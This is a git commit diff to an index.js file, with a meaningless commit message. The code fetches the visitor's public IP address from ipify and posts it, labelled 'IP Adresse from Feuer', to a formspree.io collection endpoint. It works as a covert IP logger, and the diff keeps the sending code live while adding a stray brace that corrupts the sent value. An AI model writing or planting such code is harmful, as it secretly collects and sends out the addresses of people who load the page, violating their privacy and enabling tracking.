a61a784f1dcf810eae61fc23d0f116ff14901f9d
ExotriaMC <99570532+ExotriaMC@users.noreply.github.com>
2022-03-12 12:25:59 +0100

    ADCFAguivpbsgnsv

--- index.js
+++ index.js
@@ -1,4 +1,3 @@
-var ip;
 fetch("https://api.ipify.org/?format=json", {
   "referrerPolicy": "strict-origin-when-cross-origin",
   "body": null,
@@ -6,8 +5,7 @@ fetch("https://api.ipify.org/?format=json", {
   "mode": "cors",
   "credentials": "omit"
 }).then(results => results.json()).then(data => {
-  ip = data.ip;
-  var bodyIP = `------WebKitFormBoundary3kuXXtvqujsgoBRJ\r\nContent-Disposition: form-data; name=\"IP Adresse from Feuer\"\r\n\r\n${ip}\r\n------WebKitFormBoundary3kuXXtvqujsgoBRJ--\r\n`;
+  var bodyIP = `------WebKitFormBoundary3kuXXtvqujsgoBRJ\r\nContent-Disposition: form-data; name=\"IP Adresse from Feuer\"\r\n\r\n${data.ip}}\r\n------WebKitFormBoundary3kuXXtvqujsgoBRJ--\r\n`;
   
   fetch("https://formspree.io/f/xgedkvrn", {
     "headers": {
